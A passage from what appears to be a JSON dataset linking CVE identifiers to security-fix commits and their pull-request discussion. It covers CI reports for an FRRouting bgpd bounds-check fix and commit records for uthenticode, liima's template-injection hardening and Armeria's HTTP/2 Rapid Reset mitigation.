18.04 i386 part 0\n- Addresssanitizer topotests part 3\n- Addresssanitizer topotests part 2\n- Fedora 29 rpm pkg check\n- CentOS 7 rpm pkg check\n- Topotests Ubuntu 18.04 amd64 part 4\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 i386 part 2\n- Topotests Ubuntu 18.04 amd64 part 3\n- Addresssanitizer topotests part 8\n- Topotests Ubuntu 18.04 arm8 part 8\n- Ubuntu 18.04 deb pkg check\n- Addresssanitizer topotests part 6\n- Topotests Ubuntu 18.04 i386 part 7\n- Topotests Ubuntu 18.04 amd64 part 1\n- Topotests Ubuntu 18.04 i386 part 3\n- Topotests Ubuntu 18.04 amd64 part 2\n- Topotests debian 10 amd64 part 3\n- Topotests Ubuntu 18.04 i386 part 8\n- Addresssanitizer topotests part 0\n- Topotests debian 10 amd64 part 8\n- Topotests debian 10 amd64 part 4\n- Topotests Ubuntu 18.04 arm8 part 4\n- Topotests Ubuntu 18.04 arm8 part 9\n- Debian 9 deb pkg check\n- Addresssanitizer topotests part 4\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 arm8 part 3\n- Topotests Ubuntu 18.04 i386 part 4\n- Topotests Ubuntu 18.04 i386 part 9\n- Topotests debian 10 amd64 part 2\n- Topotests Ubuntu 18.04 amd64 part 8\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 arm8 part 0\n- Static analyzer (clang)\n- Topotests debian 10 amd64 part 0\n- Topotests Ubuntu 18.04 arm8 part 2\n- Topotests Ubuntu 18.04 arm8 part 7\n- Topotests Ubuntu 18.04 amd64 part 9\n- Addresssanitizer topotests part 7\n- Ubuntu 20.04 deb pkg check\n- Ubuntu 16.04 deb pkg check\n- Debian 10 deb pkg check\n- Topotests Ubuntu 18.04 i386 part 1\n- Topotests debian 10 amd64 part 1\n- Addresssanitizer topotests part 5\n</details>\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 6: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 6: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO6U18ARM8/TopotestDetails/\nTopotests Ubuntu 18.04 arm8 part 6: No useful log found\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6DEB10AMD64-9275/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO6DEB10AMD64/TopotestLogs/log_topotests.txt\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5U18I386-9275/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO5U18I386/TopotestLogs/log_topotests.txt\nTopotests Ubuntu 18.04 i386 part 5: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO5U18I386/TopotestDetails/\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5DEB10AMD64-9275/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO5DEB10AMD64/TopotestLogs/log_topotests.txt\nTopotests debian 10 amd64 part 5: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO5DEB10AMD64/TopotestDetails/\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6U18AMD64-9275/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO6U18AMD64/TopotestLogs/log_topotests.txt\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 9: Failed (click for details)</summary>\nTopotests debian 10 amd64 part 9: Unknown Log <TopotestLogs>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO9DEB10AMD64/TopotestLogs/\nTopotests debian 10 amd64 part 9: No useful log found\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 6: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO6U18I386-9275/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 6__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO6U18I386/TopotestLogs/log_topotests.txt\nTopotests Ubuntu 18.04 i386 part 6: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO6U18I386/TopotestDetails/\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 5: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO5U18AMD64-9275/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 5__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO5U18AMD64/TopotestLogs/log_topotests.txt\nTopotests Ubuntu 18.04 amd64 part 5: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO5U18AMD64/TopotestDetails/\n</details>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 5: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 5: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-9275/artifact/TOPO5U18ARM8/TopotestDetails/\nTopotests Ubuntu 18.04 arm8 part 5: No useful log found\n</details>\n\n    Report for bgp_attr.c | 2 issues\n    ===============================================\n    < ERROR: else should follow close brace '}'\n    < #2910: FILE: /tmp/f1-3511988/bgp_attr.c:2910:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nTest incomplete. See below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10388/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Incomplete\n<details><summary>Addresssanitizer topotests part 3: Incomplete</summary>\n(check logs for details)</details>\n<details>\n<summary>Topotests debian 10 amd64 part 9: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO9DEB10AMD64-10388/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 9__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10388/artifact/TOPO9DEB10AMD64/TopotestLogs/log_topotests.txt\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 i386 part 4\n- Static analyzer (clang)\n- Topotests Ubuntu 18.04 amd64 part 1\n- Topotests debian 10 amd64 part 2\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 amd64 part 8\n- Debian 9 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 5\n- Addresssanitizer topotests part 8\n- Topotests Ubuntu 18.04 amd64 part 6\n- Topotests Ubuntu 18.04 amd64 part 9\n- Ubuntu 20.04 deb pkg check\n- Ubuntu 18.04 deb pkg check\n- Debian 10 deb pkg check\n- Addresssanitizer topotests part 6\n- Addresssanitizer topotests part 5\n- Topotests Ubuntu 18.04 arm8 part 3\n- Topotests debian 10 amd64 part 1\n- Addresssanitizer topotests part 4\n- Topotests debian 10 amd64 part 3\n- Addresssanitizer topotests part 0\n- Topotests debian 10 amd64 part 4\n- Topotests Ubuntu 18.04 i386 part 9\n- Topotests Ubuntu 18.04 arm8 part 2\n- Topotests debian 10 amd64 part 5\n- Topotests debian 10 amd64 part 0\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 arm8 part 7\n- Topotests Ubuntu 18.04 i386 part 6\n- Ubuntu 16.04 deb pkg check\n- Topotests Ubuntu 18.04 i386 part 1\n- Addresssanitizer topotests part 7\n- Topotests Ubuntu 18.04 arm8 part 8\n- Topotests debian 10 amd64 part 6\n- Topotests Ubuntu 18.04 amd64 part 5\n- Topotests Ubuntu 18.04 i386 part 2\n- Topotests Ubuntu 18.04 arm8 part 6\n- Topotests Ubuntu 18.04 arm8 part 1\n- Topotests Ubuntu 18.04 i386 part 7\n- Topotests Ubuntu 18.04 amd64 part 7\n- Fedora 29 rpm pkg check\n- Topotests Ubuntu 18.04 i386 part 5\n- Topotests Ubuntu 18.04 i386 part 3\n- Topotests Ubuntu 18.04 i386 part 0\n- Topotests Ubuntu 18.04 i386 part 8\n- Topotests Ubuntu 18.04 amd64 part 2\n- CentOS 7 rpm pkg check\n- Topotests debian 10 amd64 part 8\n- Topotests Ubuntu 18.04 amd64 part 4\n- Topotests Ubuntu 18.04 arm8 part 4\n- Addresssanitizer topotests part 2\n- Topotests Ubuntu 18.04 arm8 part 9\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests Ubuntu 18.04 amd64 part 3\n</details>\n\n</details> <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10388/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n\n    Report for bgp_attr.c | 2 issues\n    ===============================================\n    < ERROR: else should follow close brace '}'\n    < #2967: FILE: /tmp/f1-338092/bgp_attr.c:2967:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10408/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n\n    Report for bgp_attr.c | 2 issues\n    ===============================================\n    < ERROR: else should follow close brace '}'\n    < #2967: FILE: /tmp/f1-1926053/bgp_attr.c:2967:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10437/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Failed\n<details>\n<summary>Topotests Ubuntu 18.04 i386 part 2: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO2U18I386-10437/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 i386 part 2__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10437/artifact/TOPO2U18I386/TopotestLogs/log_topotests.txt\nTopotests Ubuntu 18.04 i386 part 2: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10437/artifact/TOPO2U18I386/TopotestDetails/\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Topotests Ubuntu 18.04 amd64 part 4\n- Topotests Ubuntu 18.04 i386 part 1\n- Addresssanitizer topotests part 2\n- Topotests Ubuntu 18.04 amd64 part 5\n- Topotests Ubuntu 18.04 arm8 part 1\n- Topotests debian 10 amd64 part 6\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests Ubuntu 18.04 arm8 part 6\n- Addresssanitizer topotests part 3\n- Topotests Ubuntu 18.04 arm8 part 2\n- Topotests Ubuntu 18.04 amd64 part 7\n- Fedora 29 rpm pkg check\n- Topotests debian 10 amd64 part 0\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 arm8 part 7\n- Topotests debian 10 amd64 part 5\n- CentOS 7 rpm pkg check\n- Topotests Ubuntu 18.04 i386 part 7\n- Topotests Ubuntu 18.04 arm8 part 8\n- Topotests Ubuntu 18.04 amd64 part 3\n- Addresssanitizer topotests part 6\n- Topotests debian 10 amd64 part 9\n- Topotests Ubuntu 18.04 i386 part 5\n- Topotests Ubuntu 18.04 amd64 part 1\n- Topotests Ubuntu 18.04 i386 part 0\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 amd64 part 2\n- Topotests debian 10 amd64 part 8\n- Addresssanitizer topotests part 0\n- Topotests debian 10 amd64 part 3\n- Topotests Ubuntu 18.04 amd64 part 6\n- Topotests Ubuntu 18.04 arm8 part 4\n- Ubuntu 18.04 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 9\n- Ubuntu 20.04 deb pkg check\n- Debian 10 deb pkg check\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 i386 part 4\n- Addresssanitizer topotests part 4\n- Topotests Ubuntu 18.04 amd64 part 9\n- Debian 9 deb pkg check\n- Topotests Ubuntu 18.04 i386 part 8\n- Addresssanitizer topotests part 8\n- Topotests Ubuntu 18.04 i386 part 3\n- Topotests Ubuntu 18.04 arm8 part 5\n- Topotests debian 10 amd64 part 4\n- Addresssanitizer topotests part 7\n- Topotests Ubuntu 18.04 i386 part 9\n- Topotests Ubuntu 18.04 arm8 part 3\n- Static analyzer (clang)\n- Topotests debian 10 amd64 part 1\n- Addresssanitizer topotests part 5\n- Topotests debian 10 amd64 part 2\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 i386 part 6\n- Topotests Ubuntu 18.04 amd64 part 8\n- Ubuntu 16.04 deb pkg check\n</details>\n\n</details> ci:rerun  <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10443/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Failed\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 7: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO7U18AMD64-10443/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 7__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10443/artifact/TOPO7U18AMD64/TopotestLogs/log_topotests.txt\nTopotests Ubuntu 18.04 amd64 part 7: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10443/artifact/TOPO7U18AMD64/TopotestDetails/\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Topotests Ubuntu 18.04 i386 part 6\n- Addresssanitizer topotests part 2\n- Topotests Ubuntu 18.04 amd64 part 5\n- Ubuntu 16.04 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 4\n- Topotests Ubuntu 18.04 i386 part 1\n- Topotests Ubuntu 18.04 arm8 part 7\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 arm8 part 6\n- Topotests debian 10 amd64 part 6\n- Topotests Ubuntu 18.04 arm8 part 1\n- Topotests Ubuntu 18.04 i386 part 2\n- Topotests debian 10 amd64 part 5\n- Topotests Ubuntu 18.04 arm8 part 2\n- Topotests debian 10 amd64 part 0\n- Addresssanitizer topotests part 3\n- Topotests debian 10 amd64 part 9\n- Topotests Ubuntu 18.04 arm8 part 8\n- Addresssanitizer topotests part 6\n- Topotests Ubuntu 18.04 i386 part 7\n- Fedora 29 rpm pkg check\n- CentOS 7 rpm pkg check\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 amd64 part 2\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests Ubuntu 18.04 amd64 part 3\n- Topotests debian 10 amd64 part 8\n- Topotests Ubuntu 18.04 i386 part 0\n- Topotests Ubuntu 18.04 i386 part 5\n- Ubuntu 18.04 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 4\n- Topotests Ubuntu 18.04 arm8 part 9\n- Ubuntu 20.04 deb pkg check\n- Debian 9 deb pkg check\n- Debian 10 deb pkg check\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 i386 part 4\n- Topotests Ubuntu 18.04 amd64 part 1\n- Topotests Ubuntu 18.04 i386 part 3\n- Addresssanitizer topotests part 8\n- Topotests Ubuntu 18.04 amd64 part 6\n- Topotests Ubuntu 18.04 i386 part 8\n- Topotests Ubuntu 18.04 amd64 part 9\n- Topotests debian 10 amd64 part 4\n- Addresssanitizer topotests part 7\n- Addresssanitizer topotests part 4\n- Topotests Ubuntu 18.04 arm8 part 5\n- Topotests debian 10 amd64 part 1\n- Topotests Ubuntu 18.04 arm8 part 3\n- Addresssanitizer topotests part 5\n- Topotests Ubuntu 18.04 i386 part 9\n- Topotests Ubuntu 18.04 amd64 part 8\n- Topotests debian 10 amd64 part 2\n- Topotests Ubuntu 18.04 arm8 part 0\n- Static analyzer (clang)\n- Topotests debian 10 amd64 part 3\n- Addresssanitizer topotests part 0\n</details>\n\n</details> ci:rerun another stupid ci failure <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10447/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Failed\n<details>\n<summary>Topotests debian 10 amd64 part 3: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO3DEB10AMD64-10447/test\n\n\n__Topology Tests failed for Topotests debian 10 amd64 part 3__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10447/artifact/TOPO3DEB10AMD64/TopotestLogs/log_topotests.txt\nTopotests debian 10 amd64 part 3: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10447/artifact/TOPO3DEB10AMD64/TopotestDetails/\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Ubuntu 16.04 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 5\n- Topotests debian 10 amd64 part 5\n- Topotests Ubuntu 18.04 arm8 part 2\n- Topotests Ubuntu 18.04 i386 part 1\n- Topotests Ubuntu 18.04 i386 part 6\n- Topotests Ubuntu 18.04 amd64 part 4\n- Addresssanitizer topotests part 9\n- Topotests Ubuntu 18.04 arm8 part 6\n- Topotests Ubuntu 18.04 arm8 part 7\n- Addresssanitizer topotests part 3\n- Topotests debian 10 amd64 part 6\n- Topotests Ubuntu 18.04 i386 part 7\n- Topotests Ubuntu 18.04 arm8 part 1\n- Addresssanitizer topotests part 7\n- Topotests Ubuntu 18.04 i386 part 2\n- Topotests Ubuntu 18.04 arm8 part 8\n- Topotests debian 10 amd64 part 0\n- Topotests Ubuntu 18.04 amd64 part 7\n- Addresssanitizer topotests part 6\n- Topotests Ubuntu 18.04 i386 part 5\n- Topotests Ubuntu 18.04 i386 part 0\n- Topotests debian 10 amd64 part 9\n- Fedora 29 rpm pkg check\n- CentOS 7 rpm pkg check\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests Ubuntu 18.04 amd64 part 3\n- Topotests Ubuntu 18.04 amd64 part 2\n- Topotests debian 10 amd64 part 8\n- Topotests Ubuntu 18.04 arm8 part 4\n- Topotests Ubuntu 18.04 arm8 part 9\n- Addresssanitizer topotests part 2\n- Topotests Ubuntu 18.04 amd64 part 1\n- Debian 9 deb pkg check\n- Ubuntu 18.04 deb pkg check\n- Ubuntu 20.04 deb pkg check\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 i386 part 4\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 amd64 part 9\n- Addresssanitizer topotests part 8\n- Topotests Ubuntu 18.04 i386 part 3\n- Topotests Ubuntu 18.04 i386 part 8\n- Debian 10 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 6\n- Topotests Ubuntu 18.04 arm8 part 3\n- Addresssanitizer topotests part 4\n- Topotests debian 10 amd64 part 1\n- Addresssanitizer topotests part 5\n- Topotests debian 10 amd64 part 4\n- Topotests Ubuntu 18.04 arm8 part 5\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 i386 part 9\n- Topotests Ubuntu 18.04 amd64 part 8\n- Topotests debian 10 amd64 part 2\n- Addresssanitizer topotests part 0\n- Static analyzer (clang)\n</details>\n\n</details> # Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10447/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n @Mergifyio backport stable/8.5 stable/8.4 > backport stable/8.5 stable/8.4\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#13781 bgpd: Ensure stream received has enough data (backport #12454)](https://github.com/FRRouting/frr/pull/13781) has been created for branch `stable/8.5`\n* [#13782 bgpd: Ensure stream received has enough data (backport #12454)](https://github.com/FRRouting/frr/pull/13782) has been created for branch `stable/8.4`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/8.5 stable/8.4\", \"conclusion\": \"success\"}\n-*- Mergify Payload End -*-\n-->",
            "pr_title_words": 7,
            "comments_words": 5141,
            "total_other_info_words": 5148
        },
        {
            "cve-id": "CVE-2023-40012",
            "commit_url": "https://github.com/trailofbits/uthenticode/commit/caeb1eb62412605f71bd96ce9bb9420644b6db53",
            "commit_msg": "src: bump OpenSSL, EKU check (#78)\n\n* src: bump OpenSSL, EKU check\r\n\r\nSigned-off-by: William Woodruff <william@trailofbits.com>\r\n\r\n* README: bump OpenSSL\r\n\r\nSigned-off-by: William Woodruff <william@trailofbits.com>\r\n\r\n* test: EKU test, testcase\r\n\r\nSigned-off-by: William Woodruff <william@trailofbits.com>\r\n\r\n---------\r\n\r\nSigned-off-by: William Woodruff <william@trailofbits.com>",
            "commit_msg_words": 38,
            "other_info": "src: bump OpenSSL, EKU check ~~N.B.: This needs a unit test before merging.~~",
            "pr_title_words": 5,
            "comments_words": 8,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2023-26092",
            "commit_url": "https://github.com/liimaorg/liima/commit/78ba2e198c615dc8858e56eee3290989f0362686",
            "commit_msg": "prevent usage of dangerous freemarker functions",
            "commit_msg_words": 6,
            "other_info": "542 server side template injection",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2023-44487",
            "commit_url": "https://github.com/line/armeria/commit/df7f85824a62e997b910b5d6194a3335841065fd",
            "commit_msg": "Limit max reset frames to mitigate HTTP/2 RST floods\n\nMotivation:\n\nTo mitigate against the \"HTTP/2 Rapid Reset\" attack, it is recommended\nthat HTTP/2 servers should close connections that exceed the concurrent\nstream limit.\n\nReference:\n\n- https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/\n- https://www.cve.org/CVERecord?id=CVE-2023-44487\n- https://github.com/netty/netty/commit/58f75f665aa81a8cbcf6ffa74820042a285c5e61#diff-82f568a075ff63e9727ce8622f3a2b1553099182edf1fd0b4f857226252b05adR47\n\nModifications:\n\n- Add `ServerBuilder.http2MaxRestFramesPerWindow()` option\n  `-Dcom.linecorp.armeria.defaultHttp2MaxResetFramesPerMinute<integer>`\n  property to limit the maximum allowed RST frames.\n  - If not set, 400 RST frames per minute are alllowed by default.\n- Bump Netty version to 4.1.100 from 4.1.96\n\nResult:\n\nYou can now protect your server against DDOS caused by RST floods.\n```java\nServer\n  .builder()\n  .http2MaxResetFramesPerWindow(100, 10)\n  .build();\n```",
            "commit_msg_words": 95,
            "other_info": "Limit max reset frames to mitigate HTTP/2 RST floods ## \ud83d\udd0d Build Scan\u00ae (commit: 1ee478bc92c60e47e85adfe17e4b0dc94fbccc8a)\n\n| Job name | Status | Build Scan\u00ae |\n| --- | --- | --- |\n| [build-self-hosted-jdk-8](https://github.com/line/armeria/actions/runs/6557404478/job/17808968673) | \u2705 | https://ge.armeria.dev/s/iroz76uhi5pz4 |\n| [build-self-hosted-jdk-19-snapshot-blockhound](https://github.com/line/armeria/actions/runs/6557404478/job/17808966752) | \u2705 | https://ge.armeria.dev/s/xy42ruijca34i |\n ## [Codecov](https://app.codecov.io/gh/line/armeria/pull/5232?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line) Report\nAttention: `4 lines` in your changes are missing coverage. Please review.\n> Comparison is base [(`f93ccca`)](https://app.codecov.io/gh/line/armeria/commit/f93ccca0ea955b6e1858f2b7d95974b561a98423?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line) 74.21% compared to head [(`1ee478b`)](https://app.codecov.io/gh/line/armeria/pull/5232?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line) 74.08%.\n> Report is 12 commits behind head on main.\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@             Coverage Diff              @@\n##               main    #5232      +/-   ##\n============================================\n- Coverage     74.21%   74.08%   -0.14%     \n- Complexity    19858    19978     +120     \n============================================\n  Files          1705     1717      +12     \n  Lines         73185    73600     +415     \n  Branches       9357     9366       +9     \n============================================\n+ Hits          54311    54523     +212     \n- Misses        14436    14643     +207     \n+ Partials       4438     4434       -4     \n```\n\n\n| [Files](https://app.codecov.io/gh/line/armeria/pull/5232?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line) | Coverage \u0394 | |\n|---|---|---|\n| [.../linecorp/armeria/common/DefaultFlagsProvider.java](https://app.codecov.io/gh/line/armeria/pull/5232?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-Y29yZS9zcmMvbWFpbi9qYXZhL2NvbS9saW5lY29ycC9hcm1lcmlhL2NvbW1vbi9EZWZhdWx0RmxhZ3NQcm92aWRlci5qYXZh) | `86.90% <100.00%> (+0.15%)` | :arrow_up: |\n| [...ava/com/linecorp/armeria/common/FlagsProvider.java](https://app.codecov.io/gh/line/armeria/pull/5232?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-Y29yZS9zcmMvbWFpbi9qYXZhL2NvbS9saW5lY29ycC9hcm1lcmlhL2NvbW1vbi9GbGFnc1Byb3ZpZGVyLmphdmE=) | `96.92% <100.00%> (+0.04%)` | :arrow_up: |\n| [...rp/armeria/common/SystemPropertyFlagsProvider.java](https://app.codecov.io/gh/line/armeria/pull/5232?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-Y29yZS9zcmMvbWFpbi9qYXZhL2NvbS9saW5lY29ycC9hcm1lcmlhL2NvbW1vbi9TeXN0ZW1Qcm9wZXJ0eUZsYWdzUHJvdmlkZXIuamF2YQ==) | `63.94% <100.00%> (+0.24%)` | :arrow_up: |\n| [...m/linecorp/armeria/server/DefaultServerConfig.java](https://app.codecov.io/gh/line/armeria/pull/5232?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-Y29yZS9zcmMvbWFpbi9qYXZhL2NvbS9saW5lY29ycC9hcm1lcmlhL3NlcnZlci9EZWZhdWx0U2VydmVyQ29uZmlnLmphdmE=) | `59.56% <100.00%> (+0.51%)` | :arrow_up: |\n| [...ia/server/Http2ServerConnectionHandlerBuilder.java](https://app.codecov.io/gh/line/armeria/pull/5232?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=line#diff-Y29yZS9zcmMvbWFpbi9qYXZhL2NvbS9saW5lY29ycC9hcm1lcmlhL3NlcnZlci9IdHRwMlNlcnZlckNvbm5lY3Rpb25IYW5kbGVyQnVpbGRlci5qYXZh) | `100.00% <100.00%> (\u00f8)` | |\n| 